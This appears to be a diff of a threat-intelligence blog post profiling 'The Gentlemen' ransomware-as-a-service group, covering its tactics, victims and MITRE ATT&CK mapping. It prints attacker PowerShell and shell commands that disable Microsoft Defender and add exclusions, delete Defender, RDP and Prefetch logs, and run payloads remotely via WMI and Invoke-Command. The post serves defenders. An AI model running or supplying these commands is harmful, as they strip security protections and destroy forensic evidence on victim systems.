@@ -17,40 +17,46 @@ image:
 
 # The Gentlemen Ransomware
 
-The Gentlemen Ransomware is a highly sophisticated, fast-moving ransomware group that emerged in July-August 2025, quickly establishing itself as a major global cyber threat. The group operates under a Ransomware-as-a-Service (RaaS) model, offering affiliates a customizable, cross-platform toolkit targeting different environments.
+The Gentlemen Ransomware is a highly sophisticated, fast-moving ransomware group that emerged in **July–August 2025**, quickly establishing itself as a major global cyber threat. The group operates under a **Ransomware-as-a-Service (RaaS)** model, offering affiliates a customizable, cross-platform toolkit targeting different environments.
+
+---
 
 ## Key Tactics and Techniques
 
-The Ransomware attack chain. Source - Trend Micro
-
 ![The Ransomware Attack Chain](/assets/img/the-gentlemen-ransomware/ransomware-attack-chain.webp)
 
-## Initial Access
+*Source: Trend Micro — The Ransomware Attack Chain*
+
+---
+
+## 1. Initial Access
 
 - Exploitation of internet-facing services
-- Abuse of compromised FortiGate administrative accounts
+- Abuse of compromised **FortiGate** administrative accounts
 
 ### C2 & Contact Reference
 
-Email : `negotiation_hapvida@proton.me`
+| Channel | Value |
+|---|---|
+| **Email** | `negotiation_hapvida@proton.me` |
+| **TOX ID** | `ID88984846080D639C9A4EC394E53BA616D550B2B3AD691942EA2CCD33AA5B9340FD1A8FF40E9A` |
+| **TOX Download** | `https://tox.chat/download.html` |
+| **Leak Site (Tor)** | `http://.onion/` |
+| **Tor Browser** | `https://www.torproject.org/download/` |
 
-TOX : `ID88984846080D639C9A4EC394E53BA616D550B2B3AD691942EA2CCD33AA5B9340FD1A8FF40E9A`
+---
 
-TOX Download : `https://tox.chat/download.html`
+## 2. Reconnaissance & Discovery
 
-Leak Site (Tor) : `http://.onion/`
+Network scanning performed using **Advanced IP Scanner** and **Nmap**. Enumerates all local drives and Windows Failover Cluster Shared Volumes (CSV) for encryption targeting.
 
-Tor Browser : `https://www.torproject.org/download/`
-
-## Reconnaissance & Discovery
-
-Network scanning with Advanced IP Scanner and Nmap
+### Enable Network Discovery
 
 ```powershell
 Get-NetFirewallRule -DisplayGroup "Network Discovery" | Enable-NetFirewallRule
 ```
 
-Enumerates all local drives and Windows Failover Cluster Shared Volumes (CSV) for encryption targeting.
+### Volume Enumeration
 
 ```powershell
 $volumes = @()
@@ -61,22 +67,26 @@ try {
 $volumes
 ```
 
-### System Information Display
+### System Information Banner
 
 ```powershell
 Write-Host "Windows version <version>" -BackgroundColor Blue -ForegroundColor White
 Write-Host "The Gentlemen" -BackgroundColor DarkGray -ForegroundColor White -NoNewline
 ```
 
-## Privilege Escalation
+---
 
-Execution of components with elevated privileges to gain full environment control
+## 3. Privilege Escalation
 
-### Elevated Execution
+Execution of components with elevated privileges to gain full environment control.
 
-`/RU SYSTEM`       (schtasks flag - run as SYSTEM)  
-`--system`         (ransomware flag - encrypt as SYSTEM user)  
-`Win32_Process`    (WMI process creation with elevated context)
+### Elevated Execution Flags
+
+| Flag | Description |
+|---|---|
+| `/RU SYSTEM` | `schtasks` flag — run task as SYSTEM account |
+| `--system` | Ransomware flag — encrypt as SYSTEM user |
+| `Win32_Process` | WMI class used for elevated process creation |
 
 ### WMI Elevated Process Creation
 
@@ -85,14 +95,16 @@ $p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
 $p.Create("%s")
 ```
 
-## Defense Evasion
+---
 
-- Deployment of kernel-level anti-AV utilities
-- Configuration of AV/Defender exclusions
-- Neutralization of EDR tools
-- Disabling Microsoft Defender real-time protection
+## 4. Defense Evasion
 
-### Local
+- Deployment of **kernel-level anti-AV** utilities
+- Configuration of AV/Defender exclusion paths
+- Neutralization of **EDR** tools
+- Disabling **Microsoft Defender** real-time protection
+
+### Local — Disable & Exclude
 
 ```powershell
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true;
@@ -101,13 +113,13 @@ Add-MpPreference -ExclusionPath 'C:\Temp';
 Add-MpPreference -ExclusionPath '\<share$>';"
 ```
 
-### Force
+### Forced Override
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true -Force
 ```
 
-### Remote
+### Remote — Cross-System Execution
 
 ```powershell
 Invoke-Command -ComputerName %s -ScriptBlock {
@@ -117,15 +129,19 @@ Invoke-Command -ComputerName %s -ScriptBlock {
 }
 ```
 
-Clearing telemetry and Windows event logs
+### Log & Artifact Clearing
 
-- Delete Windows Defender Support Logs: `del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*`
-- Delete RDP Log Files: `del /f /q %SystemRoot%\System32\LogFiles\RDP*\*.*`
-- Delete Windows Prefetch: `del /f /q C:\Windows\Prefetch\*.*`
+| Target | Command |
+|---|---|
+| **Defender Support Logs** | `del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*` |
+| **RDP Log Files** | `del /f /q %SystemRoot%\System32\LogFiles\RDP*\*.*` |
+| **Windows Prefetch** | `del /f /q C:\Windows\Prefetch\*.*` |
 
-## Lateral Movement & Remote Execution
+---
 
-Use of legitimate admin tools (PsExec, PowerRun, PuTTY) to transfer and execute payloads across systems
+## 5. Lateral Movement & Remote Execution
+
+Use of legitimate admin tools (**PsExec**, **PowerRun**, **PuTTY**) to transfer and execute payloads across systems.
 
 ### Remote Process Execution via WMI
 
@@ -140,9 +156,11 @@ $p.Create("%s")
 Invoke-Command -ComputerName %s -ScriptBlock { Start-Process "%s" }
 ```
 
-## Persistence & Propagation
+---
 
-GPO manipulation for domain-wide payload distribution
+## 6. Persistence & Propagation
+
+GPO manipulation for domain-wide payload distribution.
 
 ```powershell
 Invoke-Command -ComputerName %s -ScriptBlock {
@@ -152,25 +170,21 @@ Invoke-Command -ComputerName %s -ScriptBlock {
 }
 ```
 
-Use of NETLOGON/SYSVOL shares to deploy password-protected payloads
+### NETLOGON / SYSVOL Share Abuse
 
-```text
-\share$      (UNC share path reference)
---shares     (ransomware flag: encrypt UNC shares)
-NETLOGON     (referenced in LanmanServer parameters context)
-```
+| Reference | Description |
+|---|---|
+| `\share$` | UNC share path used for payload staging |
+| `--shares` | Ransomware flag: encrypt UNC/network shares |
+| `NETLOGON` | Referenced in LanmanServer context — domain-wide deployment |
+| `autorun.ini` / `autorun.inf` | AnyDesk persistent encrypted remote access |
 
-Abuse of AnyDesk as a persistent encrypted remote access channel
+---
 
-```text
-autorun.ini
-autorun.inf
-```
-
-## Data Collection & Exfiltration
+## 7. Data Collection & Exfiltration
 
 - Staging of sensitive data prior to exfiltration
-- Encrypted SFTP exfiltration using WinSCP
+- Encrypted **SFTP** exfiltration using **WinSCP**
 
 ### Volume Enumeration
 
@@ -179,25 +193,57 @@ $volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:
 $volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
 ```
 
-## Ransomware Deployment & Impact
+---
 
-- Ransomware deployment via NETLOGON using domain admin credential
-- File encryption with .7mzhh extension
-- Ransom note dropped as README-GENTLEMEN.txt
-- Termination of backup, database, and security services (Veeam, SQL, Oracle, SAP, Acronis)
+## 8. Ransomware Deployment & Impact
+
+- Ransomware deployed via **NETLOGON** share using domain admin credentials
+- File encryption with **`.7mzhh`** extension
+- Ransom note dropped as **`README-GENTLEMEN.txt`**
+- Termination of backup, database, and security services: **Veeam**, **SQL**, **Oracle**, **SAP**, **Acronis**
 - Deletion of shadow copies, logs, artifacts, and security event data
 
-## Victimology
+---
 
-- Target industries: Manufacturing, construction, healthcare, insurance, others
-- Target regions: Asia-Pacific, South America, North America, Middle East, others
-
-Victim distribution by industry, region, and country. Source - Trend Micro
+## 9. Victimology
 
 ![Victim Distribution by Industry, Region, and Country](/assets/img/the-gentlemen-ransomware/victim-distribution.webp)
 
-## Technical Analysis
+*Source: Trend Micro — Victim distribution by industry, region, and country*
+
+### Target Industries
+
+`Manufacturing` · `Construction` · `Healthcare` · `Insurance` · `Others`
+
+### Target Regions
+
+`Asia-Pacific` · `South America` · `North America` · `Middle East` · `Others`
+
+---
+
+## 10. Technical Analysis
 
 ### Execution Arguments
 
 When launched, the ransomware executable provides an extensive help message, showing various options and flags available.
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Technique ID | Tactic | Name |
+|---|---|---|
+| T1190 | Initial Access | Exploit Public-Facing Application |
+| T1078 | Initial Access | Valid Accounts |
+| T1046 | Discovery | Network Service Discovery |
+| T1082 | Discovery | System Information Discovery |
+| T1053.005 | Privilege Escalation | Scheduled Task/Job |
+| T1047 | Execution | Windows Management Instrumentation |
+| T1562.001 | Defense Evasion | Disable or Modify Tools |
+| T1070.001 | Defense Evasion | Clear Windows Event Logs |
+| T1021.006 | Lateral Movement | Remote Services: PowerShell Remoting |
+| T1570 | Lateral Movement | Lateral Tool Transfer |
+| T1567.002 | Exfiltration | Exfiltration to Cloud Storage |
+| T1486 | Impact | Data Encrypted for Impact |
+| T1490 | Impact | Inhibit System Recovery |
+| T1489 | Impact | Service Stop |
